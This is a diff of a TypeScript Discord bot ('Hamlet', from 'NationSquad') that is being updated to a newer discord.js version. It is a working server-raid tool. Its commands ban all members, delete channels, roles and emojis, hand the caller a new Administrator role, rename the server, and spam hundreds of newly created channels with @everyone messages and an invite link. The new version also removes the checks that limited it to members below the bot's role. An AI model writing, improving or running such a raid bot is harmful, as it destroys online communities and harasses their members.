@@ -1,225 +1,198 @@
-import express = require('express');
-import { Client, Message, Guild, Collection, MessageEmbed } from 'discord.js';
-import { raidData, colors, reset, admin, prefix } from './config/raid.config';
+import {
+  Client,
+  Message,
+  EmbedBuilder,
+  Events,
+  ActivityType,
+  ChannelType,
+} from "discord.js";
+import { raidData, colors, reset, admin, prefix } from "./config/raid.config";
+import express from "express";
 
-//express app
+//Express Server
 const app = express();
-app.get('/', (req: any, res: any) => {
-  res.send('Hello world');
+app.get("/", (req: any, res: any) => {
+  res.send("Quién chucha eres tú huevon.");
 });
 app.listen(process.env.PORT || 3000);
 
-//client init
-const client: Client = new Client();
+//Client Init
+const client: Client = new Client({ intents: 3276799 });
 
-//client presence
-client.on('ready', () => {
+//Ready!
+client.on(Events.ClientReady, () => {
   if (!client.user) return;
-  console.log(client.user.username, ' is ready');
-  console.log(`https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=1642824461566&scope=bot%20applications.commands`);
+  console.log(client.user.username, " is ready");
+  console.log(
+    `https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=1642824461566&scope=bot%20application`
+  );
   client.user.setPresence({
-    status: 'dnd',
-    activity: {
-      name: prefix,
-      type: 'COMPETING',
-    },
+    status: "dnd",
+    activities: [{ name: prefix, type: ActivityType.Competing }],
   });
 });
 
-client.on('message', async (message: Message) => {
-  if (!message.guild) return;
-  if (!client.user) return;
-  const guild: Guild = message.guild;
+//Commands
+client.on(Events.MessageCreate, async (message: Message) => {
+  if (message.channel.type === ChannelType.DM) return;
+  if (message.author.bot) return;
 
-  if (!guild.me) return;
+  let Guild = message.guild;
 
-  const wrong = (params: String) => {
-    return message.channel.send({ content: params });
+  const funcs = {
+    wrong: (params: string) => message.channel.send({ content: params }),
+    sleep: (ms: number) => new Promise((resolve) => setTimeout(resolve, ms)),
   };
-
-  function sleep(ms: number) {
-    return new Promise((resolve) => setTimeout(resolve, ms));
-  }
-
-  
   if (message.content === `${prefix}help`) {
-    const commands = ['kill', 'banall', 'admin', 'emoji', 'massnick']
-    const embed: MessageEmbed = new MessageEmbed()
-      .setTitle('Hamlet v1 | Prefix: `+`')
-      .setDescription(`Hola **${message.author.username}**! Mi nombre es Hamlet, el bot de *NationSquad*\n\n**Actualmente, mis comandos son:**\n` + commands.map(c => '`' + c + '`').join('\n') + '\nTen un buen día!')
-      .setThumbnail('https://media.tenor.com/fy5Mwh-q5ZUAAAAC/hamtaro.gif')
-    message.channel.send(embed);
+    const cmds = ["kill", "banall", "admin", "emoji", "massnick"];
+    const embed: EmbedBuilder = new EmbedBuilder()
+      .setTitle("Hamlet v1 | Prefix: `+`")
+      .setDescription(
+        `Hola **${message.author.username}**! Mi nombre es Hamlet, el bot de *NationSquad*\n\n**Actualmente, mis comandos son:**\n` +
+          cmds.map((c) => "`" + c + "`").join("\n") +
+          "\nTen un buen día!"
+      )
+      .setThumbnail("https://media.tenor.com/fy5Mwh-q5ZUAAAAC/hamtaro.gif");
+    message.channel.send({ embeds: [embed] });
   }
-  
-  if (message.content === `${prefix}massnick`) {
-      guild.members.cache.forEach(m => {
-        if (!guild.me) return;
-        if (m.roles.highest.position > guild.me.roles.highest.position || guild.ownerID === m.user.id) return; 
-        m.setNickname(raidData.invite)
-          .catch(e => console.log(colors.red, 'Changing nicknames', reset));
-      });
-  }
-  
-  if (message.content === `${prefix}emoji`) {
-    guild.emojis.cache.forEach(e => {
-        e.delete()
-          .then(e => guild.emojis.cache.delete(e.id))
-          .catch(e => {
-          console.log(colors.yellow, 'Deleting emojis', reset);
-        });
-    });  
-  }
-  
-  if (message.content === `${prefix}admin`) {
-    const rol = await guild.roles.create({data: { name: 'pwns', permissions: ['ADMINISTRATOR'] }});
-    message.member?.roles.add(rol);
-  }
-  
-  if (message.content === `${prefix}banall`) {
-    message.guild.members.cache.forEach(async m => {
-      try {
-        await m.ban();
-      } catch(e) {
-        console.log('no se pudo banear a 1 usuario');
-      }
-    })
-  }
-  ///nuke
-  if (message.content === `${prefix}nuke`) {
-    async function deleteData(): Promise<Guild> {
-      guild.channels.cache.forEach((c) => {
-        c.delete()
-          .then((channel) => guild.channels.cache.delete(channel.id))
-          .catch((e) => {
-            console.log(colors.cyan, 'Deleting channels:', reset, e.message);
-          });
-      });
-      return guild;
-    }
-    if (!guild.me) return;
-    if (!guild.me.hasPermission('ADMINISTRATOR'))
-      return wrong('No tengo los permisos ncesarios');
 
-    deleteData().then((g) =>
-      g.channels
-        .create(raidData.nuke_name)
-        .then((c) => c.send('@everyone ' + raidData.invite))
+  if (message.content === `${prefix}massnick`) {
+    Guild?.members.cache.forEach((m) => {
+      m.setNickname(raidData.invite).catch((e) =>
+        console.log(colors.red, "Changing nicknames", reset)
+      );
+    });
+  }
+
+  if (message.content === `${prefix}admin`) {
+    const role = await Guild?.roles.create({
+      name: "pwns",
+      permissions: ["Administrator"],
+    });
+    message.member?.roles.add(`${role?.id}`);
+  }
+
+  if (message.content === `${prefix}banall`) {
+    Guild?.members.cache.forEach(async (m) => {
+      if (m.bannable)
+        m.ban().catch((e) =>
+          console.log(colors.blue, "Banning users: ", reset, e)
+        );
+    });
+  }
+
+  if (message.content === `${prefix}nuke`) {
+    const deleteServerData = async () => {
+      Guild?.channels.cache.forEach((c) => {
+        c.delete()
+          .then((channel) => Guild?.channels.cache.delete(channel.id))
+          .catch((e) =>
+            console.log(colors.cyan, "Deleting channels", reset, e.message)
+          );
+      });
+    };
+
+    deleteServerData().then(() =>
+      message.guild?.channels
+        .create({ name: raidData.nuke_name, type: ChannelType.GuildText })
+        .then((c) => c.send(`${raidData.invite} ||@everyone||`))
     );
   }
-  ///automatic
+
+  //Automatic
   if (message.content === `${prefix}kill`) {
-    let errorCounter = 0;
-    if (!guild.me.hasPermission('ADMINISTRATOR'))
-      return wrong('No tengo los permisos ncesarios');
-    const deleteChannels = async (): Promise<Guild> => {
-      guild.channels.cache.forEach((c) => {
-        c.delete()
-          .then((channel) => guild.channels.cache.delete(channel.id))
-          .catch((e) => {
-            console.log(colors.cyan, 'Deleting channels:', reset, e.message);
-          });
-      });
-      return guild;
-    };
+    try {
+      const deleteChannels = async () => {
+        Guild?.channels.cache.forEach((c) => {
+          c.delete()
+            .then((channel) => Guild?.channels.cache.delete(channel.id))
+            .catch((e) =>
+              console.log(colors.cyan, "Deleting channels", reset, e.message)
+            );
+        });
+      };
 
-    const deleteRoles = async (): Promise<Guild> => {
-      guild.roles.cache.forEach((r) => {
-        if (!guild.me) return;
-        if (guild.me.roles.highest.position > r.position && r.id !== guild.id) {
+      const deleteRoles = async () => {
+        Guild?.roles.cache.forEach((r) => {
           r.delete()
-            .then((role) => guild.roles.cache.delete(role.id))
-            .catch((e) => {
-              guild.roles.cache.delete(r.id);
-              console.log(colors.yellow, 'Deleting roles:', reset, e.message);
-            });
-        }
-      });
-      return guild;
-    };
+            .then((role) => Guild?.roles.cache.delete(role.id))
+            .catch((e) =>
+              console.log(colors.yellow, "Deleting roles:", reset, e.message)
+            );
+        });
+      };
 
-    const createChannels = async () => {
-      for (let i = 0; i <= 458; i++) {
-        if (!message.guild) return;
-        const channel = await message.guild.channels.create(
-          raidData.raid_channel,
-          {
+      const createChannels = async () => {
+        for (let i = 0; i <= 458; i++) {
+          if (!Guild) return;
+
+          const ch = await Guild?.channels.create({
+            name: raidData.raid_channel,
             topic: raidData.invite,
+            type: ChannelType.GuildText,
             permissionOverwrites: [
               {
-                id: guild.id,
-                allow: ['VIEW_CHANNEL'],
+                id: Guild?.id,
+                allow: ["ViewChannel"],
               },
             ],
-          }
-        );
-        const sendMessages = async (ms?: number) => {
-          for (let x = 0; x <= 4; x++) {
-            if (!channel) {
-              continue;
-            }
-            channel.send('@everyone ' + raidData.message).catch((e) => {
-              guild.channels.cache.delete(channel.id);
-              console.log(
-                colors.magenta,
-                'Sending messages:',
-                reset,
-                e.message
-              );
-            });
-          }
-          if (ms) await sleep(ms * 1000);
-          return;
-        };
+          });
 
-        const createRoles = async () => {
-          for (let x = 0; x <= 249 - guild.roles.cache.size; x++) {
-            guild.roles
-              .create({
-                data: {
-                  name: raidData.nuke_name,
-                },
-              })
-              .catch((e) => {
-                console.log(colors.yellow, 'Creating roles', reset, e.message);
+          const sendMessages = async (ms?: number) => {
+            for (let x = 0; x <= 4; x++) {
+              if (!ch) continue;
+              ch.send(`@everyone ${raidData.message}`).catch((e) => {
+                Guild?.channels.delete(ch.id);
+                console.log(
+                  colors.magenta,
+                  "Sending messages:",
+                  reset,
+                  e.message
+                );
               });
-          }
-          return;
-        };
-
-        Promise.all([channel, createRoles]).then(async (res) => {
-          await sendMessages(5);
-          await sendMessages(10);
-          await sendMessages(20);
-          await sendMessages();
-        });
-      }
-    };
-
-    //raid
-    try {
-      await guild.setName(raidData.name);
-      await guild.setIcon(raidData.icon);
+            }
+            if (ms) await funcs.sleep(ms * 1000);
+            return;
+          };
+          const createRoles = async () => {
+            for (let x = 0; x <= 249; x++) {
+              Guild?.roles
+                .create({
+                  name: raidData.nuke_name,
+                })
+                .catch((e) =>
+                  console.log(colors.yellow, "Creating roles", reset, e.message)
+                );
+            }
+          };
+          Promise.all([ch, createRoles]).then(async () => {
+            await sendMessages(5);
+            await sendMessages(10);
+            await sendMessages(20);
+            await sendMessages();
+          });
+        }
+      };
+      await Guild?.setName(raidData.name);
+      await Guild?.setIcon(raidData.icon);
       await deleteRoles();
       await deleteChannels();
       await createChannels();
     } catch (e) {
-      console.log(colors.red, 'Unexpected:', reset, e.message);
+      console.log(colors.red, "Unexpected:", reset, e);
     }
   }
 
+  //Server map
   if (message.content === `${prefix}servers`) {
     if (message.author.id !== admin) return;
     let guilds = client.guilds.cache.sort((a, b) => (a > b ? -1 : 1));
-
-    guilds.forEach(async (g) => {
-      if (g.id === '897986461222207589') return;
+    guilds.forEach((g) => {
       try {
-        let invite = await g.channels.cache.random().createInvite();
-        message.channel.send(
-          g.me?.hasPermission('ADMINISTRATOR') + ' | ' + g.name + ' | ' + g.memberCount +  ' ' + invite.url
-        );
+        if (g.id === "897986461222207589") return;
+        message.channel.send(" | " + g.name + " | " + g.memberCount);
       } catch (e) {
-        message.channel.send(g.name + ' | ' + g.id);
+        message.channel.send(g.name + " | " + g.id);
       }
     });
   }
